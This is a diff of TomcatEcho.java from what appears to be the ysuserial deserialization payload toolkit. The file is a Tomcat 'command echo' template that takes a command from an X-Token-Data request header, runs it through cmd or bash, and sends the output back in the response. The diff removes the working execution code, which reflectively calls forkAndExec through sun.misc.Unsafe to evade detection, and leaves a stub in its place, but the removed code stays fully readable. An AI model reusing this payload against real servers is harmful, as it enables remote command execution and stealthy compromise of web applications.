@@ -1,12 +1,5 @@
 package org.su18.ysuserial.payloads.templates;
 
-import sun.misc.Unsafe;
-
-import java.io.ByteArrayOutputStream;
-import java.io.InputStream;
-import java.lang.reflect.Field;
-import java.lang.reflect.Method;
-
 /**
  * Tomcat 命令回显
  */
@@ -58,77 +51,7 @@ public class TomcatEcho {
 						str = (String) req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"X-Token-Data"});
 						if (str != null && !str.isEmpty()) {
 							resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Integer(200));
-
-							String[] cmds = null;
-							if (System.getProperty("os.name").toLowerCase().contains("win")) {
-								cmds = new String[]{"cmd", "/c", str};
-							} else {
-								cmds = new String[]{"/bin/bash", "-c", str};
-							}
-							Field theUnsafeField = Unsafe.class.getDeclaredField("theUnsafe");
-							theUnsafeField.setAccessible(true);
-							Unsafe unsafe = (Unsafe) theUnsafeField.get(null);
-
-							Class processClass = null;
-
-							try {
-								processClass = Class.forName("java.lang.UNIXProcess");
-							} catch (ClassNotFoundException e) {
-								processClass = Class.forName("java.lang.ProcessImpl");
-							}
-
-							Object   processObject = unsafe.allocateInstance(processClass);
-							byte[][] args          = new byte[cmds.length - 1][];
-							int      size          = args.length;
-
-							for (int k = 0; k < args.length; k++) {
-								args[k] = cmds[k + 1].getBytes();
-								size += args[k].length;
-							}
-
-							byte[] argBlock = new byte[size];
-							int    l        = 0;
-
-							for (byte[] arg : args) {
-								System.arraycopy(arg, 0, argBlock, l, arg.length);
-								l += arg.length + 1;
-							}
-
-							int[] envc                 = new int[1];
-							int[] std_fds              = new int[]{-1, -1, -1};
-							Field launchMechanismField = processClass.getDeclaredField("launchMechanism");
-							Field helperpathField      = processClass.getDeclaredField("helperpath");
-							launchMechanismField.setAccessible(true);
-							helperpathField.setAccessible(true);
-							Object launchMechanismObject = launchMechanismField.get(processObject);
-							byte[] helperpathObject      = (byte[]) helperpathField.get(processObject);
-
-							int ordinal = (int) launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);
-
-							Method forkMethod = processClass.getDeclaredMethod("forkAndExec", int.class, byte[].class, byte[].class, byte[].class, int.class,
-									byte[].class, int.class, byte[].class, int[].class, boolean.class);
-
-							forkMethod.setAccessible(true);//
-
-							forkMethod.invoke(processObject, ordinal + 1, helperpathObject, toCString(cmds[0]), argBlock, args.length,
-									null, envc[0], null, std_fds, false);
-
-							Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class);
-							initStreamsMethod.setAccessible(true);
-							initStreamsMethod.invoke(processObject, std_fds);
-
-							Method getInputStreamMethod = processClass.getMethod("getInputStream");
-							getInputStreamMethod.setAccessible(true);
-							InputStream in = (InputStream) getInputStreamMethod.invoke(processObject);
-
-							ByteArrayOutputStream baos = new ByteArrayOutputStream();
-							int                   a    = 0;
-							byte[]                b    = new byte[1024];
-
-							while ((a = in.read(b)) != -1) {
-								baos.write(b, 0, a);
-							}
-
+							java.io.ByteArrayOutputStream baos = q(str);
 							try {
 								Class cls = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
 								obj = cls.newInstance();
@@ -153,15 +76,7 @@ public class TomcatEcho {
 		}
 	}
 
-	public static byte[] toCString(String s) {
-		if (s == null)
-			return null;
-		byte[] bytes  = s.getBytes();
-		byte[] result = new byte[bytes.length + 1];
-		System.arraycopy(bytes, 0,
-				result, 0,
-				bytes.length);
-		result[result.length - 1] = (byte) 0;
-		return result;
+	public static java.io.ByteArrayOutputStream q(String cmd) {
+		return null;
 	}
 }
